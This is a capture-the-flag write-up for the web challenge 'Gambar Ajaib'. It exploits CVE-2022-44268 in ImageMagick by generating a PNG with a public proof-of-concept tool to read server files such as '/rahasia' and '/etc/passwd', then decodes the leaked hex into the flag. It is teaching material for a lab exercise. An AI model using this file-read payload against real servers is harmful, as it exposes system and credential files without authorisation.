# Gambar Ajaib
> Aplikasi ini dirancang untuk memproses gambar dengan format tertentu, kemudian dapat disulap dengan sentuhan magis aplikasinya.

> Ada satu cerita tentang sejarah Indonesia yang disembunyikan, hal itu tersimpan dengan sangat rapih di /rahasia

> Coba check dulu!

## About the Challenge
A website is provided without the source code, where users can upload PNG image files on the site.


[Image extracted text: Do Your Magic?
Choose File
No file chosen
Submit
2022]


## How to Solve?
This site is vulnerable to CVE-2022-44268, which is an LFI (Local File Inclusion) vulnerability in ImageMagick version 7.1.0-49. This conclusion is drawn from the puzzle name `Gambar Ajaib` and the website's code year being 2022. To exploit this vulnerability, I used a GitHub repository where a tool can generate images containing payloads to read files on the server. Here is the GitHub repository I used: https://github.com/Sybil-Scan/imagemagick-lfi-poc


[Image extracted text: READMEmd
ImageMagick LFI PoC [CVE-2022-44268]
The researchers at MetabaseQ discovered CVE- 2022-44268,ie: ImageMagick 7.1.0-49 is vulnerable to Information
Disclosure. When
parses
PNG image (e.g, for resize) the resulting image
have embedded the content of an
arbitrary remote file (f the ImageMagick binary has permissions to read it):
Usage
Make sure you have ImageMagick and required Python packages installed:
(~>>
python} generate-Py
[etc/passwd"
exploit-png
[>] ImageMagick LFI
by Sybil Scan
Research
cresearchOsybilscan
comx
[>] Generating Blank PNG
[>] Blank PNG generated
[>] Placing Payload
Tcdd
fetc  passwd
[>] PoC PNG generated
exploit-png
Convert the
generated PNG file:
could]


However, before proceeding with exploitation, I discovered a rather peculiar endpoint, namely `/rahasia` (which means `secret` in Indonesian). There's a possibility that this `/rahasia` endpoint is related to the challenge that is to be exploited.


[Image extracted text: 6
Not secure
OxTelctfzerobyte me.58217/rahasia
KENA PRANK?
IYAlAH!
MASA GITU DOANG_
ENAK   BENER DONG
HACK SENDIRI! Kan LU HEKER!
TAPI GUE
GAK BCHONG
LHO!
INTINYA ADA
{rahasia]


So in this case, I will attempt to read the file named "/rahasia" by executing the following command:

```bash
python3 generate.py -f "/rahasia" -o exploit.png
```

Next, upload the generated image to the website and then re-download the uploaded image. Proceed with the following shell command to view the hex code of the file named "/rahasia":

```bash
identify -verbose result.png
```


[Image extracted text: png : SRGB:
intent-0 (Perceptual Intent)
png
text
3 tEXt/zTXt/itxt
chunks
were
found
png:tIME
2023-08-19T02:15:252
Ral profile type:
68
30627974654354467b54683073335f5768305f43346e6e30745f4368346e67335f546833
31725f4d316e44735f43346e6e30545f4368346e67335f346e797468316e477d
signature: 2c6157f034438d869ae3704680e3635883188ba95635a9dd7ca09450acOc056d
Artifacts:
filename
exploit.png
verbose
true
Tainted: False
Filesize: 1487B]


Then, convert the hex code into ASCII to read the flag.


[Image extracted text: 30627974654354467654683073335f5768305f43346e6238745f4368346267335f546833
Remove whitespace
31725644316044735f4334626238545f4368346267335f346079746831624774
Spaces
Carriage returns (Vr)
Line teeds (In)
Tabs
Form feeds ()
Full stops
From Hex
Cewmitet
None
Output
Obytecte{Th8s3_Who_(Annot_ch4ng}_Th3lr_MlnDs_(Annot_Ch4ng3_Anythlngh]


```
0byteCTF{Th0s3_Wh0_C4nn0t_Ch4ng3_Th31r_M1nDs_C4nn0T_Ch4ng3_4nyth1nG}
```